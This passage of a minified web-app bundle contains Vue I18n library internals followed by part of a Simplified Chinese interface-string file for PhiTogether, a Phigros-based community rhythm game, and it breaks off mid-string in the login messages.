H(B,F){m.value[B]=assign$1(m.value[B]||{},F),O.numberFormats=m.value,clearNumberFormat(O,B,F)}composerID++,n&&inBrowser&&(watch(n.locale,B=>{o&&(l.value=B,O.locale=B,updateFallbackLocale(O,l.value,d.value))}),watch(n.fallbackLocale,B=>{o&&(d.value=B,O.fallbackLocale=B,updateFallbackLocale(O,l.value,d.value))}));const Y={id:composerID,locale:j,fallbackLocale:G,get inheritLocale(){return o},set inheritLocale(B){o=B,B&&n&&(l.value=n.locale.value,d.value=n.fallbackLocale.value,updateFallbackLocale(O,l.value,d.value))},get availableLocales(){return Object.keys(u.value).sort()},messages:X,get modifiers(){return R},get pluralRules(){return L||{}},get isGlobal(){return r},get missingWarn(){return g},set missingWarn(B){g=B,O.missingWarn=g},get fallbackWarn(){return y},set fallbackWarn(B){y=B,O.fallbackWarn=y},get fallbackRoot(){return v},set fallbackRoot(B){v=B},get fallbackFormat(){return x},set fallbackFormat(B){x=B,O.fallbackFormat=x},get warnHtmlMessage(){return k},set warnHtmlMessage(B){k=B,O.warnHtmlMessage=B},get escapeParameter(){return C},set escapeParameter(B){C=B,O.escapeParameter=B},t:ge,getLocaleMessage:T,setLocaleMessage:_,mergeLocaleMessage:N,getPostTranslationHandler:K,setPostTranslationHandler:le,getMissingHandler:se,setMissingHandler:de,[SetPluralRulesSymbol]:Z};return Y.datetimeFormats=q,Y.numberFormats=J,Y.rt=ke,Y.te=ne,Y.tm=M,Y.d=ye,Y.n=he,Y.getDateTimeFormat=P,Y.setDateTimeFormat=D,Y.mergeDateTimeFormat=V,Y.getNumberFormat=U,Y.setNumberFormat=z,Y.mergeNumberFormat=H,Y[InejctWithOptionSymbol]=s,Y[TranslateVNodeSymbol]=me,Y[DatetimePartsSymbol]=Q,Y[NumberPartsSymbol]=W,Y}function convertComposerOptions(e){const t=isString$1(e.locale)?e.locale:DEFAULT_LOCALE,n=isString$1(e.fallbackLocale)||isArray(e.fallbackLocale)||isPlainObject(e.fallbackLocale)||e.fallbackLocale===!1?e.fallbackLocale:t,s=isFunction(e.missing)?e.missing:void 0,r=isBoolean(e.silentTranslationWarn)||isRegExp(e.silentTranslationWarn)?!e.silentTranslationWarn:!0,o=isBoolean(e.silentFallbackWarn)||isRegExp(e.silentFallbackWarn)?!e.silentFallbackWarn:!0,l=isBoolean(e.fallbackRoot)?e.fallbackRoot:!0,d=!!e.formatFallbackMessages,u=isPlainObject(e.modifiers)?e.modifiers:{},f=e.pluralizationRules,m=isFunction(e.postTranslation)?e.postTranslation:void 0,g=isString$1(e.warnHtmlInMessage)?e.warnHtmlInMessage!=="off":!0,y=!!e.escapeParameterHtml,v=isBoolean(e.sync)?e.sync:!0;let x=e.messages;if(isPlainObject(e.sharedMessages)){const L=e.sharedMessages;x=Object.keys(L).reduce((I,A)=>{const j=I[A]||(I[A]={});return assign$1(j,L[A]),I},x||{})}const{__i18n:E,__root:S,__injectWithOption:w}=e,k=e.datetimeFormats,C=e.numberFormats,R=e.flatJson;return{locale:t,fallbackLocale:n,messages:x,flatJson:R,datetimeFormats:k,numberFormats:C,missing:s,missingWarn:r,fallbackWarn:o,fallbackRoot:l,fallbackFormat:d,modifiers:u,pluralRules:f,postTranslation:m,warnHtmlMessage:g,escapeParameter:y,messageResolver:e.messageResolver,inheritLocale:v,__i18n:E,__root:S,__injectWithOption:w}}function createVueI18n(e={},t){{const n=createComposer(convertComposerOptions(e)),{__extender:s}=e,r={id:n.id,get locale(){return n.locale.value},set locale(o){n.locale.value=o},get fallbackLocale(){return n.fallbackLocale.value},set fallbackLocale(o){n.fallbackLocale.value=o},get messages(){return n.messages.value},get datetimeFormats(){return n.datetimeFormats.value},get numberFormats(){return n.numberFormats.value},get availableLocales(){return n.availableLocales},get formatter(){return{interpolate(){return[]}}},set formatter(o){},get missing(){return n.getMissingHandler()},set missing(o){n.setMissingHandler(o)},get silentTranslationWarn(){return isBoolean(n.missingWarn)?!n.missingWarn:n.missingWarn},set silentTranslationWarn(o){n.missingWarn=isBoolean(o)?!o:o},get silentFallbackWarn(){return isBoolean(n.fallbackWarn)?!n.fallbackWarn:n.fallbackWarn},set silentFallbackWarn(o){n.fallbackWarn=isBoolean(o)?!o:o},get modifiers(){return n.modifiers},get formatFallbackMessages(){return n.fallbackFormat},set formatFallbackMessages(o){n.fallbackFormat=o},get postTranslation(){return n.getPostTranslationHandler()},set postTranslation(o){n.setPostTranslationHandler(o)},get sync(){return n.inheritLocale},set sync(o){n.inheritLocale=o},get warnHtmlInMessage(){return n.warnHtmlMessage?"warn":"off"},set warnHtmlInMessage(o){n.warnHtmlMessage=o!=="off"},get escapeParameterHtml(){return n.escapeParameter},set escapeParameterHtml(o){n.escapeParameter=o},get preserveDirectiveContent(){return!0},set preserveDirectiveContent(o){},get pluralizationRules(){return n.pluralRules||{}},__composer:n,t(...o){const[l,d,u]=o,f={};let m=null,g=null;if(!isString$1(l))throw createI18nError(I18nErrorCodes.INVALID_ARGUMENT);const y=l;return isString$1(d)?f.locale=d:isArray(d)?m=d:isPlainObject(d)&&(g=d),isArray(u)?m=u:isPlainObject(u)&&(g=u),Reflect.apply(n.t,n,[y,m||g||{},f])},rt(...o){return Reflect.apply(n.rt,n,[...o])},tc(...o){const[l,d,u]=o,f={plural:1};let m=null,g=null;if(!isString$1(l))throw createI18nError(I18nErrorCodes.INVALID_ARGUMENT);const y=l;return isString$1(d)?f.locale=d:isNumber(d)?f.plural=d:isArray(d)?m=d:isPlainObject(d)&&(g=d),isString$1(u)?f.locale=u:isArray(u)?m=u:isPlainObject(u)&&(g=u),Reflect.apply(n.t,n,[y,m||g||{},f])},te(o,l){return n.te(o,l)},tm(o){return n.tm(o)},getLocaleMessage(o){return n.getLocaleMessage(o)},setLocaleMessage(o,l){n.setLocaleMessage(o,l)},mergeLocaleMessage(o,l){n.mergeLocaleMessage(o,l)},d(...o){return Reflect.apply(n.d,n,[...o])},getDateTimeFormat(o){return n.getDateTimeFormat(o)},setDateTimeFormat(o,l){n.setDateTimeFormat(o,l)},mergeDateTimeFormat(o,l){n.mergeDateTimeFormat(o,l)},n(...o){return Reflect.apply(n.n,n,[...o])},getNumberFormat(o){return n.getNumberFormat(o)},setNumberFormat(o,l){n.setNumberFormat(o,l)},mergeNumberFormat(o,l){n.mergeNumberFormat(o,l)},getChoiceIndex(o,l){return-1}};return r.__extender=s,r}}const baseFormatProps={tag:{type:[String,Object]},locale:{type:String},scope:{type:String,validator:e=>e==="parent"||e==="global",default:"parent"},i18n:{type:Object}};function getInterpolateArg({slots:e},t){return t.length===1&&t[0]==="default"?(e.default?e.default():[]).reduce((s,r)=>[...s,...r.type===Fragment?r.children:[r]],[]):t.reduce((n,s)=>{const r=e[s];return r&&(n[s]=r()),n},{})}function getFragmentableTag(e){return Fragment}const TranslationImpl=defineComponent({name:"i18n-t",props:assign$1({keypath:{type:String,required:!0},plural:{type:[Number,String],validator:e=>isNumber(e)||!isNaN(e)}},baseFormatProps),setup(e,t){const{slots:n,attrs:s}=t,r=e.i18n||useI18n({useScope:e.scope,__useComponent:!0});return()=>{const o=Object.keys(n).filter(g=>g!=="_"),l={};e.locale&&(l.locale=e.locale),e.plural!==void 0&&(l.plural=isString$1(e.plural)?+e.plural:e.plural);const d=getInterpolateArg(t,o),u=r[TranslateVNodeSymbol](e.keypath,d,l),f=assign$1({},s),m=isString$1(e.tag)||isObject$1(e.tag)?e.tag:getFragmentableTag();return h(m,f,u)}}}),Translation=TranslationImpl;function isVNode(e){return isArray(e)&&!isString$1(e[0])}function renderFormatter(e,t,n,s){const{slots:r,attrs:o}=t;return()=>{const l={part:!0};let d={};e.locale&&(l.locale=e.locale),isString$1(e.format)?l.key=e.format:isObject$1(e.format)&&(isString$1(e.format.key)&&(l.key=e.format.key),d=Object.keys(e.format).reduce((y,v)=>n.includes(v)?assign$1({},y,{[v]:e.format[v]}):y,{}));const u=s(e.value,l,d);let f=[l.key];isArray(u)?f=u.map((y,v)=>{const x=r[y.type],E=x?x({[y.type]:y.value,index:v,parts:u}):[y.value];return isVNode(E)&&(E[0].key=`${y.type}-${v}`),E}):isString$1(u)&&(f=[u]);const m=assign$1({},o),g=isString$1(e.tag)||isObject$1(e.tag)?e.tag:getFragmentableTag();return h(g,m,f)}}const NumberFormatImpl=defineComponent({name:"i18n-n",props:assign$1({value:{type:Number,required:!0},format:{type:[String,Object]}},baseFormatProps),setup(e,t){const n=e.i18n||useI18n({useScope:"parent",__useComponent:!0});return renderFormatter(e,t,NUMBER_FORMAT_OPTIONS_KEYS,(...s)=>n[NumberPartsSymbol](...s))}}),NumberFormat=NumberFormatImpl,DatetimeFormatImpl=defineComponent({name:"i18n-d",props:assign$1({value:{type:[Number,Date],required:!0},format:{type:[String,Object]}},baseFormatProps),setup(e,t){const n=e.i18n||useI18n({useScope:"parent",__useComponent:!0});return renderFormatter(e,t,DATETIME_FORMAT_OPTIONS_KEYS,(...s)=>n[DatetimePartsSymbol](...s))}}),DatetimeFormat=DatetimeFormatImpl;function getComposer$2(e,t){const n=e;if(e.mode==="composition")return n.__getInstance(t)||e.global;{const s=n.__getInstance(t);return s!=null?s.__composer:e.global.__composer}}function vTDirective(e){const t=l=>{const{instance:d,modifiers:u,value:f}=l;if(!d||!d.$)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);const m=getComposer$2(e,d.$),g=parseValue(f);return[Reflect.apply(m.t,m,[...makeParams(g)]),m]};return{created:(l,d)=>{const[u,f]=t(d);inBrowser&&e.global===f&&(l.__i18nWatcher=watch(f.locale,()=>{d.instance&&d.instance.$forceUpdate()})),l.__composer=f,l.textContent=u},unmounted:l=>{inBrowser&&l.__i18nWatcher&&(l.__i18nWatcher(),l.__i18nWatcher=void 0,delete l.__i18nWatcher),l.__composer&&(l.__composer=void 0,delete l.__composer)},beforeUpdate:(l,{value:d})=>{if(l.__composer){const u=l.__composer,f=parseValue(d);l.textContent=Reflect.apply(u.t,u,[...makeParams(f)])}},getSSRProps:l=>{const[d]=t(l);return{textContent:d}}}}function parseValue(e){if(isString$1(e))return{path:e};if(isPlainObject(e)){if(!("path"in e))throw createI18nError(I18nErrorCodes.REQUIRED_VALUE,"path");return e}else throw createI18nError(I18nErrorCodes.INVALID_VALUE)}function makeParams(e){const{path:t,locale:n,args:s,choice:r,plural:o}=e,l={},d=s||{};return isString$1(n)&&(l.locale=n),isNumber(r)&&(l.plural=r),isNumber(o)&&(l.plural=o),[t,d,l]}function apply(e,t,...n){const s=isPlainObject(n[0])?n[0]:{},r=!!s.useI18nComponentName;(isBoolean(s.globalInstall)?s.globalInstall:!0)&&([r?"i18n":Translation.name,"I18nT"].forEach(l=>e.component(l,Translation)),[NumberFormat.name,"I18nN"].forEach(l=>e.component(l,NumberFormat)),[DatetimeFormat.name,"I18nD"].forEach(l=>e.component(l,DatetimeFormat))),e.directive("t",vTDirective(t))}function defineMixin(e,t,n){return{beforeCreate(){const s=getCurrentInstance();if(!s)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);const r=this.$options;if(r.i18n){const o=r.i18n;if(r.__i18n&&(o.__i18n=r.__i18n),o.__root=t,this===this.$root)this.$i18n=mergeToGlobal(e,o);else{o.__injectWithOption=!0,o.__extender=n.__vueI18nExtend,this.$i18n=createVueI18n(o);const l=this.$i18n;l.__extender&&(l.__disposer=l.__extender(this.$i18n))}}else if(r.__i18n)if(this===this.$root)this.$i18n=mergeToGlobal(e,r);else{this.$i18n=createVueI18n({__i18n:r.__i18n,__injectWithOption:!0,__extender:n.__vueI18nExtend,__root:t});const o=this.$i18n;o.__extender&&(o.__disposer=o.__extender(this.$i18n))}else this.$i18n=e;r.__i18nGlobal&&adjustI18nResources(t,r,r),this.$t=(...o)=>this.$i18n.t(...o),this.$rt=(...o)=>this.$i18n.rt(...o),this.$tc=(...o)=>this.$i18n.tc(...o),this.$te=(o,l)=>this.$i18n.te(o,l),this.$d=(...o)=>this.$i18n.d(...o),this.$n=(...o)=>this.$i18n.n(...o),this.$tm=o=>this.$i18n.tm(o),n.__setInstance(s,this.$i18n)},mounted(){},unmounted(){const s=getCurrentInstance();if(!s)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);const r=this.$i18n;delete this.$t,delete this.$rt,delete this.$tc,delete this.$te,delete this.$d,delete this.$n,delete this.$tm,r.__disposer&&(r.__disposer(),delete r.__disposer,delete r.__extender),n.__deleteInstance(s),delete this.$i18n}}}function mergeToGlobal(e,t){e.locale=t.locale||e.locale,e.fallbackLocale=t.fallbackLocale||e.fallbackLocale,e.missing=t.missing||e.missing,e.silentTranslationWarn=t.silentTranslationWarn||e.silentFallbackWarn,e.silentFallbackWarn=t.silentFallbackWarn||e.silentFallbackWarn,e.formatFallbackMessages=t.formatFallbackMessages||e.formatFallbackMessages,e.postTranslation=t.postTranslation||e.postTranslation,e.warnHtmlInMessage=t.warnHtmlInMessage||e.warnHtmlInMessage,e.escapeParameterHtml=t.escapeParameterHtml||e.escapeParameterHtml,e.sync=t.sync||e.sync,e.__composer[SetPluralRulesSymbol](t.pluralizationRules||e.pluralizationRules);const n=getLocaleMessages(e.locale,{messages:t.messages,__i18n:t.__i18n});return Object.keys(n).forEach(s=>e.mergeLocaleMessage(s,n[s])),t.datetimeFormats&&Object.keys(t.datetimeFormats).forEach(s=>e.mergeDateTimeFormat(s,t.datetimeFormats[s])),t.numberFormats&&Object.keys(t.numberFormats).forEach(s=>e.mergeNumberFormat(s,t.numberFormats[s])),e}const I18nInjectionKey=makeSymbol("global-vue-i18n");function createI18n(e={},t){const n=__VUE_I18N_LEGACY_API__&&isBoolean(e.legacy)?e.legacy:__VUE_I18N_LEGACY_API__,s=isBoolean(e.globalInjection)?e.globalInjection:!0,r=__VUE_I18N_LEGACY_API__&&n?!!e.allowComposition:!0,o=new Map,[l,d]=createGlobal(e,n),u=makeSymbol("");function f(y){return o.get(y)||null}function m(y,v){o.set(y,v)}function g(y){o.delete(y)}{const y={get mode(){return __VUE_I18N_LEGACY_API__&&n?"legacy":"composition"},get allowComposition(){return r},async install(v,...x){if(v.__VUE_I18N_SYMBOL__=u,v.provide(v.__VUE_I18N_SYMBOL__,y),isPlainObject(x[0])){const w=x[0];y.__composerExtend=w.__composerExtend,y.__vueI18nExtend=w.__vueI18nExtend}let E=null;!n&&s&&(E=injectGlobalFields(v,y.global)),__VUE_I18N_FULL_INSTALL__&&apply(v,y,...x),__VUE_I18N_LEGACY_API__&&n&&v.mixin(defineMixin(d,d.__composer,y));const S=v.unmount;v.unmount=()=>{E&&E(),y.dispose(),S()}},get global(){return d},dispose(){l.stop()},__instances:o,__getInstance:f,__setInstance:m,__deleteInstance:g};return y}}function useI18n(e={}){const t=getCurrentInstance();if(t==null)throw createI18nError(I18nErrorCodes.MUST_BE_CALL_SETUP_TOP);if(!t.isCE&&t.appContext.app!=null&&!t.appContext.app.__VUE_I18N_SYMBOL__)throw createI18nError(I18nErrorCodes.NOT_INSTALLED);const n=getI18nInstance(t),s=getGlobalComposer(n),r=getComponentOptions(t),o=getScope(e,r);if(__VUE_I18N_LEGACY_API__&&n.mode==="legacy"&&!e.__useComponent){if(!n.allowComposition)throw createI18nError(I18nErrorCodes.NOT_AVAILABLE_IN_LEGACY_MODE);return useI18nForLegacy(t,o,s,e)}if(o==="global")return adjustI18nResources(s,e,r),s;if(o==="parent"){let u=getComposer(n,t,e.__useComponent);return u==null&&(u=s),u}const l=n;let d=l.__getInstance(t);if(d==null){const u=assign$1({},e);"__i18n"in r&&(u.__i18n=r.__i18n),s&&(u.__root=s),d=createComposer(u),l.__composerExtend&&(d[DisposeSymbol]=l.__composerExtend(d)),setupLifeCycle(l,t,d),l.__setInstance(t,d)}return d}function createGlobal(e,t,n){const s=effectScope();{const r=__VUE_I18N_LEGACY_API__&&t?s.run(()=>createVueI18n(e)):s.run(()=>createComposer(e));if(r==null)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);return[s,r]}}function getI18nInstance(e){{const t=inject(e.isCE?I18nInjectionKey:e.appContext.app.__VUE_I18N_SYMBOL__);if(!t)throw createI18nError(e.isCE?I18nErrorCodes.NOT_INSTALLED_WITH_PROVIDE:I18nErrorCodes.UNEXPECTED_ERROR);return t}}function getScope(e,t){return isEmptyObject(e)?"__i18n"in t?"local":"global":e.useScope?e.useScope:"local"}function getGlobalComposer(e){return e.mode==="composition"?e.global:e.global.__composer}function getComposer(e,t,n=!1){let s=null;const r=t.root;let o=getParentComponentInstance(t,n);for(;o!=null;){const l=e;if(e.mode==="composition")s=l.__getInstance(o);else if(__VUE_I18N_LEGACY_API__){const d=l.__getInstance(o);d!=null&&(s=d.__composer,n&&s&&!s[InejctWithOptionSymbol]&&(s=null))}if(s!=null||r===o)break;o=o.parent}return s}function getParentComponentInstance(e,t=!1){return e==null?null:t&&e.vnode.ctx||e.parent}function setupLifeCycle(e,t,n){onMounted(()=>{},t),onUnmounted(()=>{const s=n;e.__deleteInstance(t);const r=s[DisposeSymbol];r&&(r(),delete s[DisposeSymbol])},t)}function useI18nForLegacy(e,t,n,s={}){const r=t==="local",o=shallowRef(null);if(r&&e.proxy&&!(e.proxy.$options.i18n||e.proxy.$options.__i18n))throw createI18nError(I18nErrorCodes.MUST_DEFINE_I18N_OPTION_IN_ALLOW_COMPOSITION);const l=isBoolean(s.inheritLocale)?s.inheritLocale:!isString$1(s.locale),d=ref(!r||l?n.locale.value:isString$1(s.locale)?s.locale:DEFAULT_LOCALE),u=ref(!r||l?n.fallbackLocale.value:isString$1(s.fallbackLocale)||isArray(s.fallbackLocale)||isPlainObject(s.fallbackLocale)||s.fallbackLocale===!1?s.fallbackLocale:d.value),f=ref(getLocaleMessages(d.value,s)),m=ref(isPlainObject(s.datetimeFormats)?s.datetimeFormats:{[d.value]:{}}),g=ref(isPlainObject(s.numberFormats)?s.numberFormats:{[d.value]:{}}),y=r?n.missingWarn:isBoolean(s.missingWarn)||isRegExp(s.missingWarn)?s.missingWarn:!0,v=r?n.fallbackWarn:isBoolean(s.fallbackWarn)||isRegExp(s.fallbackWarn)?s.fallbackWarn:!0,x=r?n.fallbackRoot:isBoolean(s.fallbackRoot)?s.fallbackRoot:!0,E=!!s.fallbackFormat,S=isFunction(s.missing)?s.missing:null,w=isFunction(s.postTranslation)?s.postTranslation:null,k=r?n.warnHtmlMessage:isBoolean(s.warnHtmlMessage)?s.warnHtmlMessage:!0,C=!!s.escapeParameter,R=r?n.modifiers:isPlainObject(s.modifiers)?s.modifiers:{},L=s.pluralRules||r&&n.pluralRules;function O(){return[d.value,u.value,f.value,m.value,g.value]}const I=computed({get:()=>o.value?o.value.locale.value:d.value,set:_=>{o.value&&(o.value.locale.value=_),d.value=_}}),A=computed({get:()=>o.value?o.value.fallbackLocale.value:u.value,set:_=>{o.value&&(o.value.fallbackLocale.value=_),u.value=_}}),j=computed(()=>o.value?o.value.messages.value:f.value),G=computed(()=>m.value),X=computed(()=>g.value);function q(){return o.value?o.value.getPostTranslationHandler():w}function J(_){o.value&&o.value.setPostTranslationHandler(_)}function K(){return o.value?o.value.getMissingHandler():S}function le(_){o.value&&o.value.setMissingHandler(_)}function se(_){return O(),_()}function de(..._){return o.value?se(()=>Reflect.apply(o.value.t,null,[..._])):se(()=>"")}function oe(..._){return o.value?Reflect.apply(o.value.rt,null,[..._]):""}function ge(..._){return o.value?se(()=>Reflect.apply(o.value.d,null,[..._])):se(()=>"")}function ke(..._){return o.value?se(()=>Reflect.apply(o.value.n,null,[..._])):se(()=>"")}function ye(_){return o.value?o.value.tm(_):{}}function he(_,N){return o.value?o.value.te(_,N):!1}function Ce(_){return o.value?o.value.getLocaleMessage(_):{}}function we(_,N){o.value&&(o.value.setLocaleMessage(_,N),f.value[_]=N)}function $e(_,N){o.value&&o.value.mergeLocaleMessage(_,N)}function me(_){return o.value?o.value.getDateTimeFormat(_):{}}function W(_,N){o.value&&(o.value.setDateTimeFormat(_,N),m.value[_]=N)}function Q(_,N){o.value&&o.value.mergeDateTimeFormat(_,N)}function Z(_){return o.value?o.value.getNumberFormat(_):{}}function ne(_,N){o.value&&(o.value.setNumberFormat(_,N),g.value[_]=N)}function fe(_,N){o.value&&o.value.mergeNumberFormat(_,N)}const M={get id(){return o.value?o.value.id:-1},locale:I,fallbackLocale:A,messages:j,datetimeFormats:G,numberFormats:X,get inheritLocale(){return o.value?o.value.inheritLocale:l},set inheritLocale(_){o.value&&(o.value.inheritLocale=_)},get availableLocales(){return o.value?o.value.availableLocales:Object.keys(f.value)},get modifiers(){return o.value?o.value.modifiers:R},get pluralRules(){return o.value?o.value.pluralRules:L},get isGlobal(){return o.value?o.value.isGlobal:!1},get missingWarn(){return o.value?o.value.missingWarn:y},set missingWarn(_){o.value&&(o.value.missingWarn=_)},get fallbackWarn(){return o.value?o.value.fallbackWarn:v},set fallbackWarn(_){o.value&&(o.value.missingWarn=_)},get fallbackRoot(){return o.value?o.value.fallbackRoot:x},set fallbackRoot(_){o.value&&(o.value.fallbackRoot=_)},get fallbackFormat(){return o.value?o.value.fallbackFormat:E},set fallbackFormat(_){o.value&&(o.value.fallbackFormat=_)},get warnHtmlMessage(){return o.value?o.value.warnHtmlMessage:k},set warnHtmlMessage(_){o.value&&(o.value.warnHtmlMessage=_)},get escapeParameter(){return o.value?o.value.escapeParameter:C},set escapeParameter(_){o.value&&(o.value.escapeParameter=_)},t:de,getPostTranslationHandler:q,setPostTranslationHandler:J,getMissingHandler:K,setMissingHandler:le,rt:oe,d:ge,n:ke,tm:ye,te:he,getLocaleMessage:Ce,setLocaleMessage:we,mergeLocaleMessage:$e,getDateTimeFormat:me,setDateTimeFormat:W,mergeDateTimeFormat:Q,getNumberFormat:Z,setNumberFormat:ne,mergeNumberFormat:fe};function T(_){_.locale.value=d.value,_.fallbackLocale.value=u.value,Object.keys(f.value).forEach(N=>{_.mergeLocaleMessage(N,f.value[N])}),Object.keys(m.value).forEach(N=>{_.mergeDateTimeFormat(N,m.value[N])}),Object.keys(g.value).forEach(N=>{_.mergeNumberFormat(N,g.value[N])}),_.escapeParameter=C,_.fallbackFormat=E,_.fallbackRoot=x,_.fallbackWarn=v,_.missingWarn=y,_.warnHtmlMessage=k}return onBeforeMount(()=>{if(e.proxy==null||e.proxy.$i18n==null)throw createI18nError(I18nErrorCodes.NOT_AVAILABLE_COMPOSITION_IN_LEGACY);const _=o.value=e.proxy.$i18n.__composer;t==="global"?(d.value=_.locale.value,u.value=_.fallbackLocale.value,f.value=_.messages.value,m.value=_.datetimeFormats.value,g.value=_.numberFormats.value):r&&T(_)}),M}const globalExportProps=["locale","fallbackLocale","availableLocales"],globalExportMethods=["t","rt","d","n","tm","te"];function injectGlobalFields(e,t){const n=Object.create(null);return globalExportProps.forEach(r=>{const o=Object.getOwnPropertyDescriptor(t,r);if(!o)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);const l=isRef(o.value)?{get(){return o.value.value},set(d){o.value.value=d}}:{get(){return o.get&&o.get()}};Object.defineProperty(n,r,l)}),e.config.globalProperties.$i18n=n,globalExportMethods.forEach(r=>{const o=Object.getOwnPropertyDescriptor(t,r);if(!o||!o.value)throw createI18nError(I18nErrorCodes.UNEXPECTED_ERROR);Object.defineProperty(e.config.globalProperties,`$${r}`,o)}),()=>{delete e.config.globalProperties.$i18n,globalExportMethods.forEach(r=>{delete e.config.globalProperties[`$${r}`]})}}initFeatureFlags();__INTLIFY_JIT_COMPILATION__?registerMessageCompiler(compile):registerMessageCompiler(compileToFunction);registerMessageResolver(resolveValue);registerLocaleFallbacker(fallbackWithLocaleChain);if(__INTLIFY_PROD_DEVTOOLS__){const e=getGlobalThis();e.__INTLIFY__=!0,setDevToolsHook(e.__INTLIFY_DEVTOOLS_GLOBAL_HOOK__)}const zh_CN={info:{info:"提示",cancel:"取消",confirm:"确认",mod:"修改",error:"错误",switchRespackReloadConfirm:"切换 PhiTogether 资源包预设需要刷新页面生效，现在刷新页面吗？",customRespackAppliedSuccessfully:"自定义资源包应用成功"},pages:{"/startpage":"主页","/chartselect":"谱面选择","/playing":"游玩","/login":"登录到 PhiZone","/calibrate":"延迟校准","/cachemanage":"缓存管理","/aboutpage":"关于","/chartupload":"谱面上传","/chartedit":"信息编辑","/playerb20":"玩家 B20","/pzranksingle":"???","/replaypage":"回放","/changelogs":"更新日志","/multipanel":"多人游戏面板","/settings":"设置","/loading":"正在加载","/multiindex":"联机大厅"},startPage:{viewB20:"查看B20",retryLogin:"重试登录",switch:"切换",logout:"登出",login:"登录",unLogined:"未登录",singleGame:"单人游戏",multiGame:"多人游戏",caches:"缓存",replay:"回放",gameSettings:"游戏设置",forcedFullscreen:"强制全屏",about:"关于",serviceStatus:"服务状态",updateLogs:"更新日志",redirectToCustomURL:"请输入自定义 sim-phi 链接来跳转",logoutConfirm:"您确定要登出账号吗？",logoutSuccessfully:"您已登出，现在您已进入离线模式。",offlineNotice:"您没有连接到互联网，将只能游玩本地缓存谱面。",askForLogin:"您当前处于离线模式，所有游玩数据将不会保存，要登录账号吗？",askForRelogin:"您当前处于离线模式，所有游玩数据将不会保存，要登录账号吗？",offlineMPNotice:"您没有连接到互联网，无法进行多人游戏！",noaccountmodeMPNotice:"您没有登录账号或账号状态异常，无法进行多人游戏，请重新登录后再试！",loadingUserConfig:"正在加载用户设置",judgeRangeMPNotice:"若要进行多人游戏，请将您的判定范围设置为 Perfect±80ms Good±160ms",fullscreenjudgeMPNotice:"若要进行多人游戏，关闭全屏判定",errLoadingUserConfig:"获取用户配置时出错",restoreMP:"检测到您有未正常退出的多人游戏，您需要恢复吗？",recoverMP:"正在恢复多人游戏",recoverMPFailed:"尝试恢复未正常退出的多人游戏失败，如需开启新的多人游戏请重新点击多人游戏按钮。",recoverMPNetProblem:"恢复未正常退出的多人游戏时遇到网络错误，请点击多人游戏按钮重试",mpMaintainanceNotice:"多人游戏正在维护",antiAddictionIssue:"实名认证错误"},multiIndex:{join:"加入房间",create:"创建房间",roomId:"房间号码",goPublic:"公开房间",description:"房间描述",roomId_cannot_be_empty:"房间ID不得为空",loadRoomInfo:"加载房间信息",owner:"房主",roomListEmpty:"找不到房间",roomFull:"房间满员",roomLocked:"房间已锁定",byId:"根据ID",byRks:"根据rks",byPlayerNumber:"根据人数",search:"搜索",refresh:"刷新",avgRks:"平均rks",err:"操作失败",joining:"正在验证身份信息并联机",roomIdCantContainsDollar:"房间ID中不得含有 $"},aboutPage:{life:"自上线起已运行 {0} 天",QQGuild:"QQ 频道:PhiTogether233",bio:"PhiTogether 是一款玩法基于 Phigros 的 <b> 非商业性 </b> 社区音乐游戏，集成 PhiZone",supportUs:"如果您喜欢我们，欢迎支持我们的运营！您的支持是我们最大的动力！",relationshipWithPG:"此项目与 厦门鸽游网络有限公司 没有任何关系",roles:{projectCreator:"主创",developers:"开发",soundDesigner:"音效",visualEffects:"特效",communityManager:"社区",gameArtist:"美术"},realtvop:{isTheWorst:"最拉垮"},thanksToOther:"并在此感谢所有为此项目提出宝贵建议的玩家和共建者们！",externalLinks:"友情链接",sponsors:"赞助者列表"},cacheManage:{deletedSuccessfully:"删除成功",confirmBeforeDeleteData:"您确定要删除数据吗？",confirmBeforeDelete:"您确定要删除吗？",delete:"删除",allDataDeleted:"PhiTogether 已完成移除在您设备上存储的所有数据，请直接关闭 PhiTogether，在您下次打开 PhiTogether 时仍会在您设备上缓存新的数据！",separate:"孤立",cachedFileTitle:"{0}的缓存文件",deleteThisGroupOfFiles:"删除本组",file:"文件",type:"类型",operation:"操作",music_illustration:"音乐和曲绘",chart:"谱面",additionRes:"额外资源"},calibrate:{title:"偏移率设置",description1:"在每个第三拍(重拍)点击按钮",description2:"本结果仅供参考，不同输入方式(键盘/鼠标/触摸)的延迟可能会有所不同",click:"点击",start:"开始",loadFile:"正在加载校准音频...",loadSuccess:"校准音频加载成功。",loadError:"校准音频加载失败。",decodeError:"错误：校准音频解码失败。",confirm:"您要把延迟值设置为 {c} 吗？"},changelogs:{title:"更新日志"},chartSelect:{jumpto:"请输入您要跳转的页码 (1 - {0})",inputDosentMatchRequirement:"您的输入不合法",favourites:{add:"收藏",addedSuccessfully:"{0} 收藏成功",remove:"取消收藏",removedSuccessfully:"{0} 取消收藏成功"},multiSyncChart:{sync:"正在同步谱面",failed:"同步谱面失败"},songSource:{local:"本地谱面",favourites:"收藏谱面",pz:"&nbsp;PZ&nbsp;&nbsp;社区&nbsp;",pt:"&nbsp;PT&nbsp;&nbsp;社区&nbsp;"},search:"搜索曲名",import:"导入",chartListIsEmpty:"谱面列表为空",pageCount:"第{page}页 共{pageAll}页",playConfig:{mirror:"谱面镜像",adjustOffset:"调整延迟",previewMode:"预览模式",practiseMode:"练习模式",videoRecorder:"视频录制",speed:"速度",speeds:{slowest:"极慢",slower:"较慢",normal:"正常",faster:"较快",fastest:"极快"}},previewLoadFailed:"音频预览加载失败。",loadingChartList:"正在加载谱面列表",loadingChapterList:"正在加载章节列表",loadFailed:"加载失败",pgmChartNote:"该谱面为 Phigrim 官方谱面！关注 Phigrim 喵，关注 Phigrim 谢谢喵！",unableToSelectDueToCopyrightReasons:"抱歉，由于版权原因，您无法选择本谱面，请更换其它谱面游玩！",loadingChart:"正在加载谱面",edit:"编辑",delete:"删除",select:"选择",rankings:"排行",thisSongHasNoPlayableCharts:"该歌曲暂无可游玩谱面！",chartSelect:"谱面选择",config:"游玩配置"},loadingPage:{loadingRes:"正在加载资源"},login:{usernameAndPasswordCantBeEmpty:"用户名和密码不得为空！",loggingin:"正在登录",email:"邮箱",passwd:"密码",signin:"登录",signup:"注册",noTapTapBinding:"无法找到当前 TapTap 账号绑定的 PhiZone 账号，请使用 PhiZone 账号登录",askTapTapBinding:"您要将此 PhiZone 账号与 TapTap 